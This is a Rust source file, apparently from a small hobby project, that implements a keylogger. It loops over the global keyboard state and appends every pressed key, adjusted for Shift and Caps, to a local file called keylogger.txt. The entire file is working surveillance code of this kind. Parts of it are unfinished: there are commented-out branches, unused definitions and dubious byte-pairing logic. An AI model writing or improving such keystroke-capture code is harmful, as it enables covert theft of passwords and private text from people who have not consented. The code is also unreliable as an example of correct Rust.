mod key_value;
mod util;

use util::enumerations::enumerations::{ forVec };

extern crate keyboard_query;

use std::borrow::{Borrow, Cow};
use std::str;
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::path::Path;

use keyboard_query::{DeviceQuery, DeviceState};

// use crate::key_value::key::Clone;
use crate::key_value::key::{BytesModifier, ModifierEvent};

macro_rules! ternary_operator {
    ($test:expr => $true_expr:expr; $false_expr:expr) => {
        if $test {
            $true_expr
        }
        else {
            $false_expr
        }
    }
}

struct MultiClick {
    prev_byte: u8,
    multi_click_bytes: Vec<u8>,
    multi_click: bool
}

fn main() {
    let device_state = DeviceState::new();
    let mut prev_keys = vec![];

    let mut file = match Path::new("keylogger.txt").exists() {
        true => OpenOptions::new().read(true).write(true).open("keylogger.txt").expect("не открыть файл"),
        false => File::create("keylogger.txt").expect("не получилось создать файл")
    };

    let mut caps_active: bool = false;
    let mut prev_latter_byte = vec![];

    loop {
        let mut keys: Vec<u8> = device_state.get_keys().iter().map(|&n| *&n as u8).collect();
        let result_bytes_modifier = BytesModifier::define_modifier(&keys, &prev_latter_byte);

        if keys != prev_keys {
            if keys.len() > 0 {
                // 68 = d, 65 = a, 78 = n, 73 = i, l = 76
                let modifier = result_bytes_modifier.modifier_bytes;

                println!("prev: {:?}\nresolve: {:?}\n\n", result_bytes_modifier, &result_bytes_modifier);

                if result_bytes_modifier.latter_bytes.len() == 2 {
                    for prev_byte in 0..result_bytes_modifier.prev_byte_modifier.len() {
                        for byte in 0..result_bytes_modifier.latter_bytes.len() {
                            if &result_bytes_modifier.prev_byte_modifier[prev_byte] != &result_bytes_modifier.latter_bytes[byte] {
                                write_mod(modifier, String::from_utf8_lossy((&[result_bytes_modifier.prev_byte_modifier[prev_byte]]).borrow()), &file, &result_bytes_modifier);
                                if byte == 1 {
                                    write_mod(modifier, String::from_utf8_lossy((&[result_bytes_modifier.latter_bytes[byte - 1]]).borrow()), &file, &result_bytes_modifier);
                                } else {
                                    write_mod(modifier, String::from_utf8_lossy((&[result_bytes_modifier.latter_bytes[byte + 1]]).borrow()), &file, &result_bytes_modifier);
                                }
                            }
                        }
                    }
                }

                // if result_bytes_modifier.prev_byte_modifier.len() == 2 {
                //     for byte in &result_bytes_modifier.prev_byte_modifier {
                //         for latter in &result_bytes_modifier.latter_bytes {
                //             if *byte != *latter {
                //                 write_mod(modifier, String::from_utf8_lossy((&[*latter]).borrow()), &file, &result_bytes_modifier)
                //             }
                //         }
                //     }
                // } else if result_bytes_modifier.prev_byte_modifier.len() == 3 {
                //     println!("{:?}", result_bytes_modifier.prev_byte_modifier.len());
                // }
                prev_latter_byte = result_bytes_modifier.latter_bytes.clone();
            }
        }
        prev_keys = keys;
    }
}

fn write_mod (
        modifier: ModifierEvent, byte_to_string: Cow<str>,
        mut file: &File, result_bytes_modifier: &BytesModifier
    ) {
    match modifier {
        ModifierEvent::SHIFT => {
            file.write_all(&*result_bytes_modifier.latter_bytes).expect("Error writing file!");
        },
        ModifierEvent::CTRL => println!("ctrl"),
        ModifierEvent::NOT_MODIFIER => {
            file.write_all(String::from_utf8_lossy(byte_to_string.to_lowercase().as_ref()).as_ref().as_ref());
        },
        ModifierEvent::ALT => println!("alt"),
        _ => println!("Not found modifier")
    };
}